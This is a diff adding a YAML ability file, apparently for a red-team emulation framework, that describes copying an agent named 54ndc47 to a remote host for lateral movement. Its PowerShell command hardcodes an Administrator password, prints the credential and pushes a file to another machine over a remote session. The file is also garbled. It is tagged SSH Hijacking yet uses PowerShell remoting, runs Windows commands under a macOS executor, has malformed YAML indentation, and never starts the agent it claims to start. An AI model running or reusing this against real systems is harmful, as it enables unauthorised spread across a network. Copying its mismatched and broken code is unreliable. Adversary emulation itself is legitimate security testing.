@@ -1,0 +1,30 @@
+---
+
+- id: 10a9d979-e342-418a-a9b0-002c483e0fa6
+  name: Move 54ndc47
+  description: Copy 54ndc47 to remote host and start it
+  tactic: lateral-movement
+  technique:
+    attack_id: T1184
+    name: SSH Hijacking
+  executors:
+    darwin:
+      command: |
+
+# create credential
+$username = "Administrator"
+
+$password = "P@ssw0rd"
+
+$secstr = New-Object -TypeName System.Security.SecureString
+
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+write-host $cred
+
+# write agent
+$File = [System.IO.File]::ReadAllBytes("C:\Users\Administrator.MOUNTAINPEAK\Desktop\one.txt")
+$session = New-PSSession -ComputerName work001-testdomain -Credential $cred
+Invoke-Command -Session $session -ArgumentList $file -ScriptBlock{[System.IO.File]::WriteAllBytes("C:\one.txt", $args)}
+
